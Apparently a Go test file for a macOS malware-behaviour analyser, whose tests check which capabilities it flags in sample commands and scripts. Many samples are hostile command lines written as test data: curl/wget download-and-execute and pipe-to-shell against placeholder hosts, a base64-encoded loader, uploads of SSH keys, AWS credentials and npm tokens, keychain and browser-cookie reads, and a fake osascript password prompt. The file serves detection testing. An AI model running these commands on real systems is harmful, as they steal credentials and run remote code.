package report

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"slices"
	"sort"
	"strconv"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestInspectScriptDownloadExecuteRelations(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.sh")
	body := "curl https://payload.example/update -o /tmp/update\nchmod +x /tmp/update\n/tmp/update\n"
	if err := os.WriteFile(path, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertCapability(t, rep, "macos.file-make-executable")
	assertCapabilityConnectivity(t, rep, "macos.download-execute", "CONNECTED")
	assertNetworkDestination(t, rep, "https://payload.example/update")
	assertDownloadExecuteRelationPath(t, rep, true)
}

func TestInspectCompiledAppleScriptReportsUnsupportedSemanticsWithoutParsingBytesAsText(t *testing.T) {
	path := filepath.Join(t.TempDir(), "misleading.jpg")
	data := append([]byte("FasdUAS 1.101.10\x00\x04\x0f\xff\xff"), []byte("\ncurl https://should-not-be-parsed.example/p | sh\n")...)
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.ArtifactNodes) != 1 || rep.ArtifactNodes[0].Kind != "compiled-applescript" ||
		rep.ArtifactNodes[0].MediaType != "application/x-apple-compiled-applescript" {
		t.Fatalf("compiled AppleScript input was not magic-classified: %#v", rep.ArtifactNodes)
	}
	if len(rep.ExecutionRoots) != 1 || rep.ExecutionRoots[0].Kind != "compiled-applescript" || rep.ExecutionRoots[0].StartNodeID != rep.ArtifactNodes[0].ID {
		t.Fatalf("compiled AppleScript root should be an execution root: %#v", rep.ExecutionRoots)
	}
	if len(rep.Operations) != 0 || len(rep.Features) != 0 || len(rep.NetworkImplementations) != 0 || len(rep.Capabilities) != 0 {
		t.Fatalf("compiled AppleScript binary bytes were semantically parsed as text: operations=%#v features=%#v network=%#v capabilities=%#v", rep.Operations, rep.Features, rep.NetworkImplementations, rep.Capabilities)
	}
	assertCoverageContains(t, rep, "compiled-applescript-semantics", "partial", "bytecode/decompilation is not implemented")
	assertReportReferencesValid(t, rep)
}

func TestInspectInlineShellCurlCompactOutputDownloadExecute(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl -fsSLo /tmp/p https://compact.example/p && chmod +x /tmp/p && /tmp/p", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertNetworkDestination(t, rep, "https://compact.example/p")
	assertResource(t, rep, "macos.download-execute", "file", "/tmp/p")
}

func TestInspectInlineShellDownloadExecuteNormalizesRelativePathSpelling(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl -o ./payload https://relative.example/p && chmod +x payload && ./payload", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertNetworkDestination(t, rep, "https://relative.example/p")
	assertDownloadExecuteRelationPath(t, rep, true)
}

func TestInspectInlineShellChmodExecutableModes(t *testing.T) {
	tests := []string{
		"curl https://payload.example/a -o /tmp/a; chmod u+x /tmp/a; /tmp/a",
		"curl https://payload.example/a -o /tmp/a; chmod a+x /tmp/a; /tmp/a",
		"curl https://payload.example/a -o /tmp/a; chmod u=rwx,go=rx /tmp/a; /tmp/a",
		"curl https://payload.example/a -o /tmp/a; chmod 700 /tmp/a; /tmp/a",
		"curl https://payload.example/a -o /tmp/a; chmod 0755 /tmp/a; /tmp/a",
	}
	for _, command := range tests {
		t.Run(command, func(t *testing.T) {
			rep, err := inspectInlineShellForTest(command, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			assertCapability(t, rep, "macos.download-execute")
			assertOperation(t, rep, "file.make-executable", "file", "/tmp/a")
			assertDownloadExecuteRelationPath(t, rep, true)
		})
	}
}

func TestInspectInlineShellChmodRemoveExecuteDoesNotCreateMakeExecutableOperation(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl https://payload.example/a -o /tmp/a; chmod -x /tmp/a; /tmp/a", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertNoOperation(t, rep, "file.make-executable", "file", "/tmp/a")
	assertDownloadExecuteRelationPath(t, rep, false)
	assertNoDownloadExecuteRelationPath(t, rep, true)
}

func TestInspectInlineShellChmodNonExecutableModeDoesNotCreateMakeExecutableOperation(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl https://payload.example/a -o /tmp/a; chmod 600 /tmp/a; /tmp/a", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertNoOperation(t, rep, "file.make-executable", "file", "/tmp/a")
	assertDownloadExecuteRelationPath(t, rep, false)
	assertNoDownloadExecuteRelationPath(t, rep, true)
}

func TestInspectInlineShellWgetCompactOutputDownloadExecute(t *testing.T) {
	rep, err := inspectInlineShellForTest("wget -qO /tmp/w https://wgetcompact.example/p && chmod +x /tmp/w && /tmp/w", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertNetworkDestination(t, rep, "https://wgetcompact.example/p")
	assertResource(t, rep, "macos.download-execute", "file", "/tmp/w")
}

func TestInspectInlineShellCurlRemoteNameDoesNotInventOutputPath(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl -fsSLO https://remote-name.example/p && chmod +x /tmp/p && /tmp/p", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("curl -O should not invent a local output path: %#v", rep.Capabilities)
	}
	assertNetworkDestination(t, rep, "https://remote-name.example/p")
}

func TestInspectInlineShellDownloaderOutputOnlyIsNotDownloadExecute(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl -o /tmp/p && chmod +x /tmp/p && /tmp/p", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("curl output path without request operand should not become download-execute: %#v", rep.Capabilities)
	}
	assertNoOperation(t, rep, "network.download", "file", "/tmp/p")
}

func TestInspectInlineShellDownloaderOutputOnlyPipeIsNotPipeToInterpreter(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl -o /tmp/p | sh", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("curl output path without request operand should not become pipe-to-interpreter: %#v", rep.Capabilities)
	}
}

func TestInspectInlineShellDownloaderDynamicOperandRemainsDownload(t *testing.T) {
	rep, err := inspectInlineShellForTest(`curl "$URL" -o /tmp/p && chmod +x /tmp/p && /tmp/p`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertOperation(t, rep, "network.download", "file", "/tmp/p")
}

func TestInspectPipeToShell(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl https://clickfix.example/a | sh", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-pipe-interpreter")
}

func TestInspectInlineShellShellCommandStringPipe(t *testing.T) {
	rep, err := inspectInlineShellForTest(`bash -lc 'curl https://shellc.example/p | sh'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-pipe-interpreter")
	assertNetworkDestination(t, rep, "https://shellc.example/p")
}

func TestInspectInlineShellShellCommandStringDownloadExecute(t *testing.T) {
	rep, err := inspectInlineShellForTest(`sh -c 'curl https://shc.example/p -o /tmp/p && chmod +x /tmp/p && /tmp/p'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertNetworkDestination(t, rep, "https://shc.example/p")
}

func TestInspectInlineShellBase64DecodedShellDownloadExecute(t *testing.T) {
	rep, err := inspectInlineShellForTest(`echo Y3VybCBodHRwczovL2RlY29kZWQuZXhhbXBsZS9wIC1vIC90bXAveDsgY2htb2QgK3ggL3RtcC94OyAvdG1wL3g= | base64 -D | sh`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertNetworkDestination(t, rep, "https://decoded.example/p")
	assertResource(t, rep, "macos.download-execute", "file", "/tmp/x")
	assertFeature(t, rep, "shell.base64_decoded_script", "literal base64 pipeline")
}

func TestInspectInlineShellDynamicBase64PipelineIsNotDecoded(t *testing.T) {
	rep, err := inspectInlineShellForTest(`echo "$PAYLOAD" | base64 -D | sh`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.NetworkImplementations) != 0 || hasCapability(rep, "macos.download-execute") {
		t.Fatalf("dynamic base64 input should not be decoded: capabilities=%#v network=%#v", rep.Capabilities, rep.NetworkImplementations)
	}
}

func TestInspectInlineShellLiteralShellVariableDestination(t *testing.T) {
	rep, err := inspectInlineShellForTest(`URL=https://assigned.example/payload; curl -fsSL "$URL" -o /tmp/p; chmod +x /tmp/p; /tmp/p`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.download-execute")
	assertNetworkDestination(t, rep, "https://assigned.example/payload")
}

func TestInspectInlineShellShellCommandStringMentionIsNotExecuted(t *testing.T) {
	rep, err := inspectInlineShellForTest(`echo bash -lc 'curl https://not-shellc.example/p | sh'`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("plain shell -c mention should not be executable behavior: %#v", rep.Capabilities)
	}
	assertNoNetworkDestination(t, rep, "https://not-shellc.example/p")
}

func TestInspectInlineShellCommandWrappersExposeNetworkBehavior(t *testing.T) {
	tests := []struct {
		command string
		dest    string
	}{
		{`sudo curl https://sudo.example/payload | sh`, "https://sudo.example/payload"},
		{`env HTTPS_PROXY=http://proxy.invalid curl https://env.example/payload | sh`, "https://env.example/payload"},
		{`sudo sh -c "curl https://sudosh.example/p | sh"`, "https://sudosh.example/p"},
		{`/usr/bin/env bash -lc "curl https://envbash.example/p | sh"`, "https://envbash.example/p"},
	}
	for _, tt := range tests {
		rep, err := inspectInlineShellForTest(tt.command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertCapability(t, rep, "macos.download-pipe-interpreter")
		assertNetworkDestination(t, rep, tt.dest)
		assertNoNetworkDestination(t, rep, "http://proxy.invalid")
	}
}

func TestInspectInlineShellWrapperAssignmentIsNotNetworkBehavior(t *testing.T) {
	rep, err := inspectInlineShellForTest(`env URL=https://not-command.example/p`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.NetworkImplementations) != 0 || hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("env assignment should not become network behavior: capabilities=%#v network=%#v", rep.Capabilities, rep.NetworkImplementations)
	}
}

func TestInspectInlineShellDownloaderDisabledCertificateVerification(t *testing.T) {
	tests := []struct {
		command string
		dest    string
	}{
		{`curl -k https://insecure.example/payload`, "https://insecure.example/payload"},
		{`curl -k -- https://insecure-terminator.example/payload`, "https://insecure-terminator.example/payload"},
		{`curl --insecure https://pipe-insecure.example/payload | sh`, "https://pipe-insecure.example/payload"},
		{`wget --no-check-certificate https://wget-insecure.example/payload`, "https://wget-insecure.example/payload"},
	}
	for _, tt := range tests {
		rep, err := inspectInlineShellForTest(tt.command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertNetworkDestination(t, rep, tt.dest)
		assertNetworkSecurity(t, rep, "TLS certificate verification disabled")
	}
}

func TestInspectInlineShellDownloaderDefaultCertificateVerification(t *testing.T) {
	rep, err := inspectInlineShellForTest(`curl https://secure.example/payload`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, rep, "https://secure.example/payload")
	assertNoNetworkSecurity(t, rep, "TLS certificate verification disabled")
}

func TestInspectInlineShellDownloaderCurlConfigOptionDoesNotDisableCertificateVerification(t *testing.T) {
	rep, err := inspectInlineShellForTest(`curl -K curl.conf https://secure.example/payload`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNetworkDestination(t, rep, "https://secure.example/payload")
	assertNoNetworkSecurity(t, rep, "TLS certificate verification disabled")
}

func TestInspectInlineShellDownloaderOptionTerminatorStopsCertificateOptionParsing(t *testing.T) {
	rep, err := inspectInlineShellForTest(`curl -- --insecure`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoNetworkSecurity(t, rep, "TLS certificate verification disabled")
}

func TestInspectInlineShellBrowserCookieRead(t *testing.T) {
	rep, err := inspectInlineShellForTest(`sqlite3 "$HOME/Library/Application Support/Google/Chrome/Default/Cookies" .dump`, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.browser-credential-collection")
	assertResource(t, rep, "macos.browser-credential-collection", "browser.cookies", "$HOME/Library/Application Support/Google/Chrome/Default/Cookies")
}

func TestInspectInlineShellKeychainFileRead(t *testing.T) {
	rep, err := inspectInlineShellForTest("cat ~/Library/Keychains/login.keychain-db", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.keychain-access")
	assertResource(t, rep, "macos.keychain-access", "keychain", "~/Library/Keychains/login.keychain-db")
}

func TestInspectInlineShellSecurityNonReadCommandsStayNeutral(t *testing.T) {
	for _, command := range []string{
		"security list-keychains",
		"security add-generic-password -s example -a user -w secret",
		"security delete-generic-password -s example -a user",
		"security unlock-keychain login.keychain-db",
	} {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		if hasCapability(rep, "macos.keychain-access") {
			t.Fatalf("non-read security command %q became credential access: %#v", command, rep.Capabilities)
		}
		assertEvidenceValue(t, rep, command)
	}
}

func TestInspectInlineShellSecurityCommandPreservesConcreteKeychainPath(t *testing.T) {
	rep, err := inspectInlineShellForTest("security dump-keychain ~/Library/Keychains/login.keychain-db", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.keychain-access")
	assertResource(t, rep, "macos.keychain-access", "keychain", "~/Library/Keychains/login.keychain-db")
}

func TestInspectInlineShellSecurityGlobalOptionPreservesCommandTarget(t *testing.T) {
	rep, err := inspectInlineShellForTest("security -q find-generic-password -s example", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.keychain-access")
	assertResource(t, rep, "macos.keychain-access", "keychain", "find-generic-password service=example")
}

func TestInspectInlineShellDeveloperCredentialRead(t *testing.T) {
	rep, err := inspectInlineShellForTest("cat ~/.ssh/id_ed25519", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-material-collection")
	assertResource(t, rep, "macos.credential-material-collection", "ssh-private-key", "~/.ssh/id_ed25519")
}

func TestInspectInlineShellSensitiveUploadSource(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl --upload-file ~/.ssh/id_rsa https://upload.example/keys", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-material-collection")
	assertNetworkDestination(t, rep, "https://upload.example/keys")
	assertResource(t, rep, "macos.credential-material-collection", "ssh-private-key", "~/.ssh/id_rsa")
}

func TestInspectInlineShellSensitiveUploadShortOptionSource(t *testing.T) {
	tests := []string{
		"curl -T ~/.ssh/id_rsa https://upload.example/keys",
		"curl -T~/.ssh/id_rsa https://upload.example/keys",
	}
	for _, command := range tests {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertCapability(t, rep, "macos.credential-material-collection")
		assertNetworkDestination(t, rep, "https://upload.example/keys")
		assertResource(t, rep, "macos.credential-material-collection", "ssh-private-key", "~/.ssh/id_rsa")
	}
}

func TestInspectInlineShellSensitiveCurlDataUploadSource(t *testing.T) {
	tests := []struct {
		command  string
		dest     string
		category string
		source   string
	}{
		{"curl --data-binary @~/.ssh/id_rsa https://upload.example/keys", "https://upload.example/keys", "ssh-private-key", "~/.ssh/id_rsa"},
		{"curl -d @~/.aws/credentials https://upload.example/cloud", "https://upload.example/cloud", "cloud-credentials", "~/.aws/credentials"},
		{"curl -d@~/.aws/credentials https://upload.example/cloud", "https://upload.example/cloud", "cloud-credentials", "~/.aws/credentials"},
		{"curl --data-urlencode token@~/.npmrc https://upload.example/token", "https://upload.example/token", "developer-token", "~/.npmrc"},
	}
	for _, tt := range tests {
		rep, err := inspectInlineShellForTest(tt.command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertCapability(t, rep, "macos.credential-material-collection")
		assertNetworkDestination(t, rep, tt.dest)
		assertResource(t, rep, "macos.credential-material-collection", tt.category, tt.source)
	}
}

func TestInspectInlineShellSensitiveCurlFormUploadSource(t *testing.T) {
	tests := []string{
		"curl -F file=@~/.ssh/id_rsa https://upload.example/form",
		"curl -Ffile=@~/.ssh/id_rsa https://upload.example/form",
		"curl --form file=@~/.ssh/id_rsa https://upload.example/form",
		"curl --form=file=@~/.ssh/id_rsa https://upload.example/form",
		"curl -F file=<~/.ssh/id_rsa https://upload.example/form",
	}
	for _, command := range tests {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertCapability(t, rep, "macos.credential-material-collection")
		assertNetworkDestination(t, rep, "https://upload.example/form")
		assertResource(t, rep, "macos.credential-material-collection", "ssh-private-key", "~/.ssh/id_rsa")
	}
}

func TestInspectInlineShellCurlAtFileMentionOutsideUploadOptionIsNotRead(t *testing.T) {
	tests := []string{
		"curl 'https://query.example/search?file=@~/.ssh/id_rsa'",
		"curl --form-string file=@~/.ssh/id_rsa https://query.example/form",
	}
	for _, command := range tests {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		if hasCapability(rep, "macos.credential-material-collection") {
			t.Fatalf("curl @file mention outside file-reading upload option should not become collection: %#v", rep.Capabilities)
		}
		assertNoOperation(t, rep, "network.upload", "network-destination", "https://query.example/form")
	}
}

func TestInspectInlineShellCurlDataRawDoesNotReadUploadFile(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl --data-raw @~/.ssh/id_rsa https://upload.example/keys", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.credential-material-collection") {
		t.Fatalf("curl --data-raw should not read @file syntax: %#v", rep.Capabilities)
	}
}

func TestInspectInlineShellUploadOptionTerminatorStopsUploadParsing(t *testing.T) {
	rep, err := inspectInlineShellForTest("curl -- -T ~/.ssh/id_rsa https://upload.example/keys", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.credential-material-collection") {
		t.Fatalf("upload option after terminator should not become credential collection: %#v", rep.Capabilities)
	}
}

func TestInspectInlineShellTarSensitiveSource(t *testing.T) {
	rep, err := inspectInlineShellForTest("tar -czf /tmp/keys.tgz ~/.ssh/id_ed25519 && curl --upload-file /tmp/keys.tgz https://upload.example/keys", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-material-collection")
	assertCapability(t, rep, "macos.archive-local-data")
	assertCapability(t, rep, "macos.upload-staged-data")
	assertResource(t, rep, "macos.credential-material-collection", "ssh-private-key", "~/.ssh/id_ed25519")
	assertNetworkDestination(t, rep, "https://upload.example/keys")
}

func TestInspectInlineShellArchiveUploadRequiresExactSameFileFlow(t *testing.T) {
	rep, err := inspectInlineShellForTest("tar -czf /tmp/keys.tgz ~/.ssh/id_ed25519 && curl --upload-file /tmp/other.tgz https://upload.example/keys", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.archive-local-data")
	if hasCapability(rep, "macos.upload-staged-data") {
		t.Fatalf("different archive and upload files became staged-data flow: %#v", rep.Capabilities)
	}
}

func TestInspectInlineShellStreamedArchiveStillReadsSensitiveSource(t *testing.T) {
	for _, command := range []string{
		"tar -cf - ~/.ssh/id_rsa",
		"tar -c ~/.ssh/id_rsa",
		"zip - ~/.ssh/id_rsa",
	} {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		assertCapability(t, rep, "macos.credential-material-collection")
		assertOperation(t, rep, behavior.OperationFileRead, "ssh-private-key", "~/.ssh/id_rsa")
		assertNoOperation(t, rep, behavior.OperationArchiveCreate, "archive", "-")
	}
}

func TestInspectInlineShellTarFileEqualsSensitiveSource(t *testing.T) {
	rep, err := inspectInlineShellForTest("tar --file=/tmp/cloud.tgz -cz ~/.aws/credentials", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-material-collection")
	assertResource(t, rep, "macos.credential-material-collection", "cloud-credentials", "~/.aws/credentials")
}

func TestInspectInlineShellArchiveOptionSensitivePathIsNotCollection(t *testing.T) {
	for _, command := range []string{
		"tar --exclude ~/.ssh/id_rsa -czf /tmp/out.tgz /tmp/src",
		"zip -r /tmp/out.zip /tmp/src -x ~/.ssh/id_rsa",
		"zip -P ~/.ssh/id_rsa /tmp/out.zip /tmp/src",
	} {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		if hasCapability(rep, "macos.credential-material-collection") {
			t.Fatalf("%q option value should not become credential collection: %#v", command, rep.Capabilities)
		}
	}
}

func TestInspectInlineShellArchiveMaintenanceDoesNotReadSensitiveOperand(t *testing.T) {
	for _, command := range []string{
		"tar -tf /tmp/out.tar ~/.ssh/id_rsa",
		"tar -xzf /tmp/out.tgz ~/.ssh/id_rsa",
		"zip -d /tmp/out.zip ~/.ssh/id_rsa",
		"zip -sf /tmp/out.zip ~/.ssh/id_rsa",
		"ditto -xk ~/.ssh/id_rsa /tmp/out",
	} {
		rep, err := inspectInlineShellForTest(command, artifact.Options{})
		if err != nil {
			t.Fatal(err)
		}
		if hasCapability(rep, "macos.credential-material-collection") {
			t.Fatalf("archive maintenance command %q became credential collection: %#v", command, rep.Capabilities)
		}
		assertNoOperation(t, rep, behavior.OperationFileRead, "ssh-private-key", "~/.ssh/id_rsa")
	}
}

func TestInspectInlineShellKeychainPathMentionIsNotAccess(t *testing.T) {
	rep, err := inspectInlineShellForTest("echo ~/Library/Keychains/login.keychain-db", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.keychain-access") {
		t.Fatalf("plain keychain path mention should not be access: %#v", rep.Capabilities)
	}
}

func TestInspectInlineShellSensitivePathMentionIsNotCollection(t *testing.T) {
	rep, err := inspectInlineShellForTest("echo ~/.ssh/id_ed25519", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.credential-material-collection") {
		t.Fatalf("plain sensitive path mention should not be collection: %#v", rep.Capabilities)
	}
}

func TestInspectShellSensitivePathMentionIsNotCollection(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "mention.sh")
	if err := os.WriteFile(path, []byte("echo ~/.ssh/id_ed25519\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.credential-material-collection") {
		t.Fatalf("shell echo of sensitive path should not be collection: %#v", rep.Capabilities)
	}
}

func TestInspectPythonSensitivePathMentionIsNotCollection(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "mention.py")
	if err := os.WriteFile(path, []byte(`print("~/.ssh/id_ed25519")`), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.credential-material-collection") {
		t.Fatalf("python print of sensitive path should not be collection: %#v", rep.Capabilities)
	}
}

func TestInspectScriptNativeAPIMentionsAreNotCapabilities(t *testing.T) {
	tests := []struct {
		name   string
		file   string
		mode   fs.FileMode
		body   string
		ruleID string
	}{
		{
			name:   "shell-keychain-api-mention",
			file:   "mention.sh",
			mode:   0o700,
			body:   "echo SecItemCopyMatching\n",
			ruleID: "macos.keychain-access",
		},
		{
			name:   "shell-clipboard-command-mention",
			file:   "mention.sh",
			mode:   0o700,
			body:   "echo pbpaste\n",
			ruleID: "macos.clipboard-read",
		},
		{
			name:   "python-keychain-api-mention",
			file:   "mention.py",
			mode:   0o600,
			body:   `print("SecItemCopyMatching")`,
			ruleID: "macos.keychain-access",
		},
		{
			name:   "javascript-keychain-api-mention",
			file:   "mention.js",
			mode:   0o600,
			body:   `console.log("SecItemCopyMatching")`,
			ruleID: "macos.keychain-access",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			path := filepath.Join(root, tt.file)
			if err := os.WriteFile(path, []byte(tt.body), tt.mode); err != nil {
				t.Fatal(err)
			}
			rep, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			if hasCapability(rep, tt.ruleID) {
				t.Fatalf("plain native API or command mention should not produce %s: %#v", tt.ruleID, rep.Capabilities)
			}
		})
	}
}

func TestInspectNativeSourceLiteralOSAScriptPasswordPrompt(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "Prompt.m")
	body := strings.Join([]string{
		`void prompt() {`,
		`    system("osascript -e 'display dialog \"Password:\" default answer \"\" with hidden answer'");`,
		`}`,
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-prompt")
	assertOperation(t, rep, "credential.prompt", "user-password", "")
	if len(rep.Capabilities) != 1 {
		t.Fatalf("a credential prompt should produce only the neutral prompt capability: %#v", rep.Capabilities)
	}
	for _, operation := range rep.Operations {
		if operation.Kind == "credential.prompt" {
			if operation.SourceFunction != "prompt" || operation.Execution.Connectivity != behavior.ConnectivityUnknown {
				t.Fatalf("native-source prompt should remain function-scoped and unresolved: %#v", operation)
			}
			return
		}
	}
	t.Fatalf("missing credential prompt operation: %#v", rep.Operations)
}

func TestInspectNativeSourceLiteralOSAScriptAndDSCLRemainIndependentOperations(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "Prompt.m")
	body := strings.Join([]string{
		`void prompt() {`,
		`    system("osascript -e 'display dialog \"Password:\" default answer \"\" with hidden answer'");`,
		`    system("dscl . authonly $USER secret");`,
		`}`,
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-prompt")
	assertCapability(t, rep, "macos.credential-validation")
	if len(rep.Capabilities) != 2 {
		t.Fatalf("same-function prompt and validation must remain independent primitives: %#v", rep.Capabilities)
	}
	assertOperation(t, rep, "credential.prompt", "user-password", "")
	assertOperation(t, rep, "credential.validate", "user-password", "")
	for _, operation := range rep.Operations {
		if operation.Kind == "credential.validate" && operation.Qualifiers["mechanism"] != "dscl authonly" {
			t.Fatalf("credential validation mechanism missing: %#v", operation)
		}
	}
}

func TestInspectNativeSourceLiteralOSAScriptAndDSCLRetainCallFeatureWithoutComposite(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "Prompt.m")
	body := strings.Join([]string{
		`- (void)getPassword {`,
		`    system("osascript -e 'display dialog \"Password:\" default answer \"\" with hidden answer'");`,
		`    if ([self verifyPassword:username password:password]) {`,
		`        return;`,
		`    }`,
		`}`,
		`- (BOOL)verifyPassword:(NSString *)username password:(NSString *)password {`,
		`    system("dscl . authonly $USER secret");`,
		`    return true;`,
		`}`,
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-prompt")
	assertCapability(t, rep, "macos.credential-validation")
	if len(rep.Capabilities) != 2 {
		t.Fatalf("a call edge without credential identity must retain independent primitives: %#v", rep.Capabilities)
	}
	assertOperation(t, rep, "credential.prompt", "user-password", "")
	assertOperation(t, rep, "credential.validate", "user-password", "")
	assertFeature(t, rep, "script.function_call", "verifyPassword:password:")
}

func TestInspectNativeSourceLiteralOSAScriptAndDSCLRemainIndependentWithoutCall(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "Prompt.m")
	body := strings.Join([]string{
		`- (void)getPassword {`,
		`    system("osascript -e 'display dialog \"Password:\" default answer \"\" with hidden answer'");`,
		`}`,
		`- (BOOL)verifyPassword:(NSString *)username password:(NSString *)password {`,
		`    system("dscl . authonly $USER secret");`,
		`    return true;`,
		`}`,
	}, "\n")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.credential-prompt")
	assertCapability(t, rep, "macos.credential-validation")
	if len(rep.Capabilities) != 2 {
		t.Fatalf("separate prompt and validation functions should produce independent primitives: %#v", rep.Capabilities)
	}
	assertOperation(t, rep, "credential.prompt", "user-password", "")
	assertOperation(t, rep, "credential.validate", "user-password", "")
}

func TestInspectNativeSourceProseLiteralDoesNotCreatePrompt(t *testing.T) {
	root := t.TempDir()
